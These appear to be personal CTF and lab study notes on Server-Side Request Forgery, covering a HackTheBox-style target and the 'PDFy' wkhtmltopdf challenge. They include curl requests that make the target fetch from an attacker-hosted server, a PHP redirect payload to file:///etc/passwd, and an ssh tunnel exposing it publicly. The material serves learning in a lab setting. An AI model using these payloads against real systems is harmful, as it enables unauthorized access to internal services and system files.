* Web application fuzzing
* https://medium.com/%E7%A8%8B%E5%BC%8F%E7%8C%BF%E5%90%83%E9%A6%99%E8%95%89/%E7%B6%B2%E7%AB%99%E5%AE%89%E5%85%A8-%E4%BC%BA%E6%9C%8D%E5%99%A8%E8%AB%8B%E6%B1%82%E5%81%BD%E9%80%A0-ssrf-%E6%94%BB%E6%93%8A-%E9%A0%85%E8%8E%8A%E8%88%9E%E5%8A%8D-%E6%84%8F%E5%9C%A8%E6%B2%9B%E5%85%AC-7a5524926362
---
# <span style=color:#44D62C>Server-Side Request Forgery</span>
![image](https://hackmd.io/_uploads/rksnWPE4R.png)
![image](https://hackmd.io/_uploads/r1PQqw4VA.png)
![image](https://hackmd.io/_uploads/B1q4qDEEA.png)

---
* curl -i -s http://10.129.201.238
```http
HTTP/1.0 302 FOUND
Content-Type: text/html; charset=utf-8
Content-Length: 242
Location: http://<TARGET IP>/load?q=index.html
Server: Werkzeug/2.0.2 Python
Date: Mon, 18 Oct 2021 09:01:02 GMT

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to target URL: <a href="/load?q=index.html">/load?q=index.html</a>. If not click the link.
```
* /load?q=index.html --> redriect to index.html
    * <span style=color:red>parameter q may has SSRF?</span>
* curl -i -s -L http://10.129.201.238
```http
HTTP/1.0 302 FOUND
Content-Type: text/html; charset=utf-8
Content-Length: 242
Location: http://<TARGET IP>/load?q=index.html
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Mon, 18 Oct 2021 10:20:27 GMT

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 153
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Mon, 18 Oct 2021 10:20:27 GMT

<html>
<!-- ubuntu-web.lalaguna.local & internal.app.local load resources via q parameter -->
<body>
<h1>Bad App</h1>
<a>Hello World!</a>
</body>
</html>
```
## Test SSRF
* creat the 'index.html' file
* open the http server using python3 under the index.html's path 
* curl -i -s "http://10.129.201.238/load?q=http://10.10.14.10:8080/index.html"

![Screenshot_20240529_163244](https://hackmd.io/_uploads/r1CEuwV40.jpg)

---
# <span style=color:red>Challenge - PDFy</span>
![image](https://hackmd.io/_uploads/rkWVxG9NA.png)
* exploit
    * https://exploit-notes.hdks.org/exploit/web/security-risk/wkhtmltopdf-ssrf/#exploitation
* writeup
    * https://writeup.raunak-neupane.com.np/web-ctfs/hackthebox/pdfy
    * https://medium.com/@Pdaysec/htb-pdfy-challenge-490e678bd521
```php
<!DOCTYPE=html>
<html>
    <body>
        <h1></h1>
            <?php
                  header('location:file:///etc/passwd');
            ?>
    </body>
</html>        
```

* php -S 127.0.0.1:1234
* ssh -R 80:localhost:1234 nokey@localhost.run

![image](https://hackmd.io/_uploads/ByoBCG5ER.png)

* https://96d0eb125b437c.lhr.life/PDFy.php

![image](https://hackmd.io/_uploads/ByOPRz5EC.png)
